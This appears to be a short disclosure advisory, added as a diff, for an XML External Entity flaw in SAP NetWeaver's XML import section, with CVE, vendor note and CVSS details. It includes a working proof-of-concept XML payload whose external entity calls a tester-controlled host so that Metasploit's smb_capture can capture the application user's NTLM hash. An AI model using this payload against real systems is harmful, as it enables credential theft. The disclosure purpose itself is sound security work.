@@ -1,0 +1,56 @@
+Title: SAP Netwaver - XML External Entity Injection
+Author: Lukasz Miedzinski
+GPG: Public key provided in attachment
+Date: 29/10/2014
+CVE: CVE-2015-7241
+
+Affected software :
+===================
+
+SAP Netwear : <7.01
+
+Vendor advisories (only for customers):
+===================
+External ID : 851975 2014
+Title:  XML External Entity vulnerability in SAP XML Parser
+Security Note: 2098608
+Advisory Plan Date: 12/5/2014
+Delivery date of fix/Patch Day: 10/2/2014
+CVSS Base Score: 5.5
+CVSS Base Vector: AV:N/AC:L/AU:S/C:P/I:N/A:P
+
+
+Description :
+=============
+XML External Entity Injection vulnerability has been found in the XML
+parser in the System
+
+Administration->XML Content and Actions -> Import section.
+
+
+Vulnerabilities :
+*****************
+
+XML External Entity Injection :
+======================
+
+
+Example show how pentester is able to get NTLM hash of application's user.
+
+Content of file (PoC) :
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "file:////Tester.IP/test"> %remote; %param1; ]>
+<root/>
+
+When pentester has metasploit smb_capture module run, then application
+will contatc him and provide
+
+NTLM hash of user.
+
+
+Contact :
+=========
+
+Lukasz[dot]Miedzinski[at]gmail[dot]com
